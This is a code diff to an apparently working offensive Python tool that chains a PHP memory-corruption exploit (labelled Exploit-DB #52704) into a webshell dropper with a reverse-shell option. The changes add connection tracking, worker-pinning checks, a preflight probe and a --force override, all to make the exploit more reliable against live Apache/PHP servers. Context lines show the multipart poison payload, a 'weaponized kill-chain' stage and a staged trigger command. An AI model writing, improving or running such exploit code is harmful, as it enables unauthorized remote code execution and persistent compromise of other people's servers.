@@ -789,6 +789,11 @@ class RawHttpTarget:
         self.verbose = verbose
         self.keep_alive = keep_alive
         self._sock: Optional[socket.socket] = None
+        self.conn_id: int = 0
+        self.requests_on_socket: int = 0
+        self.last_server_headers: Dict[str, str] = {}
+        self.last_connection_header: Optional[str] = None
+        self.last_status_code: int = 0
 
     def _connect(self) -> socket.socket:
         last = None
@@ -802,6 +807,8 @@ class RawHttpTarget:
                     s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 except OSError:
                     pass
+                self.conn_id += 1
+                self.requests_on_socket = 0
                 return s
             except OSError as e:
                 last = e
@@ -812,6 +819,12 @@ class RawHttpTarget:
         if self._sock is None:
             self._sock = self._connect()
         return self._sock
+
+    def is_connected(self) -> bool:
+        return self._sock is not None
+
+    def get_connection_id(self) -> int:
+        return self.conn_id
 
     def close(self) -> None:
         if self._sock is not None:
@@ -839,8 +852,22 @@ class RawHttpTarget:
             self.close()
             return bytes(data)
 
-        # Check if server requested connection closure
-        conn_close = bool(re.search(rb"(?i)connection:\s*close", head)) or not self.keep_alive
+        self.requests_on_socket += 1
+        self.last_server_headers = {}
+        lines = head.split(b"\r\n")
+        if lines:
+            m_st = re.match(rb"HTTP/1\.[01]\s+(\d{3})", lines[0])
+            self.last_status_code = int(m_st.group(1)) if m_st else 0
+            for hline in lines[1:]:
+                hk, hsep, hv = hline.partition(b":")
+                if hsep:
+                    self.last_server_headers[hk.decode("latin1", errors="replace").strip().lower()] = (
+                        hv.decode("latin1", errors="replace").strip()
+                    )
+
+        conn_hdr = self.last_server_headers.get("connection", "").lower()
+        self.last_connection_header = conn_hdr or None
+        conn_close = (conn_hdr == "close") or not self.keep_alive
 
         # Check Content-Length
         cl_match = re.search(rb"(?i)content-length:\s*(\d+)", head)
@@ -1004,11 +1031,22 @@ class ExploitDB52704Engine:
         time.sleep(0.5)
 
     def _attempt_stage1(self, n: int) -> int:
+        cid_before = self.t.get_connection_id()
         parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
         parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                   self._file_part(), self._big_field()]
         self.t.post(build_multipart_payload(parts, b"S" * 17), b"S" * 17, timeout=90.0)
         time.sleep(0.2)
+
+        cid_after_poison = self.t.get_connection_id()
+        is_pinned = (cid_before == cid_after_poison) and self.t.is_connected()
+        if not is_pinned:
+            self._log(
+                "  └─ [Worker Pinning Failure]:",
+                f"Socket closed by server after poison request (conn #{cid_before} -> #{cid_after_poison}). "
+                "Target Apache worker process affinity was broken; leak request will land on an unpinned worker."
+            )
+
         parts = [{"name": "PHPSESSID", "data": DEFAULT_SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
         for i in range(n):
             parts.append({"name": str(1000 + i), "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
@@ -1029,8 +1067,8 @@ class ExploitDB52704Engine:
 
         self._calibration_swept = True
 
-        # Auto-calibration: sweep candidate stage1_n values
-        self._log("  └─ [Auto-Calibration]:", f"Initial stage1_n={self.stage1_n} produced no leak; sweeping calibration window...")
+        # Stage 1 Candidate Sweep: sweep candidate stage1_n allocation counts
+        self._log("  └─ [Stage 1 Sweep]:", f"Initial stage1_n={self.stage1_n} produced no leak; sweeping candidate allocation counts...")
         candidate_offsets = []
         for d in [-1, 1, -2, 2, -3, 3, -4, 4, 5, -5]:
             val = self.stage1_n + d
@@ -1042,10 +1080,10 @@ class ExploitDB52704Engine:
 
         for cand in candidate_offsets:
             self.rotate()
-            self._log("  └─ [Auto-Calibration]:", f"Probing candidate stage1_n={cand}...")
+            self._log("  └─ [Stage 1 Sweep]:", f"Probing candidate stage1_n={cand}...")
             chunk = self._attempt_stage1(cand)
             if chunk:
-                self._log("  └─ [Auto-Calibration]:", f"Success! Calibrated stage1_n={cand} (Chunk=0x{chunk:x})")
+                self._log("  └─ [Stage 1 Sweep]:", f"Found matching allocation count stage1_n={cand} (Chunk=0x{chunk:x})")
                 self.stage1_n = cand
                 return chunk
 
@@ -1577,6 +1615,32 @@ class UnifiedPHP2Shell:
         self.progress("[4/5 WAF]", wa.summary, Fore.GREEN)
         return wa
 
+    def run_preflight_check(self, endpoint: str, raw_tgt: RawHttpTarget) -> Dict[str, Any]:
+        """Verify remote server transport parameters before binary memory exploitation."""
+        self.progress("  └─ [Preflight Check]:", f"Testing transport & worker-pinning prerequisites on {endpoint}...", Fore.BLUE)
+        status, _ = raw_tgt.get(raw_tgt.path)
+        conn_hdr = (raw_tgt.last_connection_header or "").lower()
+        server_banner = raw_tgt.last_server_headers.get("server", "unknown")
+        supports_keepalive = (conn_hdr != "close") and raw_tgt.is_connected()
+
+        report = {
+            "status": status,
+            "connection_header": conn_hdr or "none",
+            "supports_keepalive": supports_keepalive,
+            "server_banner": server_banner,
+        }
+
+        if supports_keepalive:
+            self.progress("  └─ [Preflight OK]:", f"Persistent HTTP/1.1 active (Server: {server_banner}). Worker pinning supported.", Fore.GREEN)
+        else:
+            self.progress(
+                "  └─ [Preflight Warning]:",
+                f"Target returned 'Connection: {conn_hdr or 'close'}' (Server: {server_banner}). "
+                "Target closes TCP connections after requests; persistent worker pinning cannot be guaranteed.",
+                Fore.YELLOW,
+            )
+        return report
+
     # -----------------------------------------------------------------------
     # STAGE 5: Weaponized Exploitation (Exploit-DB #52704 & Webshell Dropper)
     # -----------------------------------------------------------------------
@@ -1606,6 +1670,7 @@ class UnifiedPHP2Shell:
         auto_calibrate: bool = True,
         pin_worker: bool = True,
         elf_path: Optional[str] = None,
+        force: bool = False,
     ) -> ExploitResult:
         ep = endpoint or target
         self.progress("[5/5 EXPLOIT]", f"Executing weaponized kill-chain against: {ep}", Fore.RED)
@@ -1617,6 +1682,30 @@ class UnifiedPHP2Shell:
         if method in ("auto", "binary", "52704", "exploitdb"):
             self.progress("  └─ [Exploit-DB #52704]", f"Starting memory corruption chain (profile={profile})...", Fore.YELLOW)
             try:
+                raw_tgt = RawHttpTarget(ep, timeout=float(self.timeout), verbose=False, keep_alive=pin_worker)
+
+                # Preflight verification: Ensure server permits persistent HTTP/1.1 connections for worker pinning
+                preflight = self.run_preflight_check(ep, raw_tgt)
+                if not preflight["supports_keepalive"] and method in ("binary", "52704", "exploitdb") and not force:
+                    raw_tgt.close()
+                    res.status = ExploitStatus.UNCONFIRMED
+                    res.command_output = None
+                    res.details = (
+                        f"Binary exploitation halted: Target terminates HTTP connections (Connection: {preflight['connection_header']}). "
+                        "Persistent worker pinning cannot be established across multi-request memory corruption stages. "
+                        "Pass --force to attempt anyway, or use --exploit-method auto for multipart persistence fallback."
+                    )
+                    self.progress("  └─ [Exploit-DB #52704]:", "Aborted: Remote server closes connections. Worker pinning unavailable (use --force to override).", Fore.RED)
+                    return res
+
+                if profile.lower() in ("trixie", "debian13") and not elf_path and not zif_offset:
+                    self.progress(
+                        "  └─ [Profile Notice]:",
+                        "Profile 'trixie' / 'debian13' is using reference Bookworm symbol offsets. "
+                        "Debian 13 layouts require exact target binary calibration (use --elf /path/to/target/libphp.so).",
+                        Fore.YELLOW,
+                    )
+
                 if elf_path:
                     elf_offsets = extract_elf_offsets(elf_path)
                     if "zif_offset" in elf_offsets and not zif_offset:
@@ -1634,6 +1723,7 @@ class UnifiedPHP2Shell:
                 try:
                     cmd_bytes = target_cmd.encode("latin1")
                 except UnicodeEncodeError:
+                    raw_tgt.close()
                     res.status = ExploitStatus.ERROR
                     res.details = "Command cannot be represented in Latin-1 encoding."
                     return res
@@ -1646,6 +1736,7 @@ class UnifiedPHP2Shell:
                     trigger = carrier_trigger or DEFAULT_STAGED_TRIGGER
                     trigger_bytes = trigger.strip().encode("latin1")
                     if len(trigger_bytes) > MAX_CMD_LEN:
+                        raw_tgt.close()
                         res.status = ExploitStatus.ERROR
                         res.details = f"Trigger command ({len(trigger_bytes)}B) exceeds carrier limit ({MAX_CMD_LEN}B)."
                         self.progress("  └─ [Exploit-DB #52704]", res.details, Fore.YELLOW)
@@ -1658,7 +1749,6 @@ class UnifiedPHP2Shell:
                         Fore.CYAN,
                     )
 
-                raw_tgt = RawHttpTarget(ep, timeout=float(self.timeout), verbose=False, keep_alive=pin_worker)
                 engine_52704 = ExploitDB52704Engine(
                     target=raw_tgt,
                     cmd=carrier_cmd,
@@ -2147,6 +2237,8 @@ def build_cli() -> argparse.ArgumentParser:
     p.add_argument("--carrier-trigger", default=None,
                    help="Custom short trigger command for staged exploit payload (default: 'sh /tmp/php*')")
     p.add_argument("--reverse", action="store_true", help="Spawn reverse shell callback")
+    p.add_argument("--force", action="store_true",
+                   help="Bypass preflight worker-pinning check and attempt binary exploitation anyway")
     return p
 
 def main() -> int:
@@ -2287,6 +2379,7 @@ def main() -> int:
                 auto_calibrate=args.auto_calibrate,
                 pin_worker=args.pin_worker,
                 elf_path=args.elf_path,
+                force=args.force,
             )
             t_res["exploit_result"] = asdict(er)
 
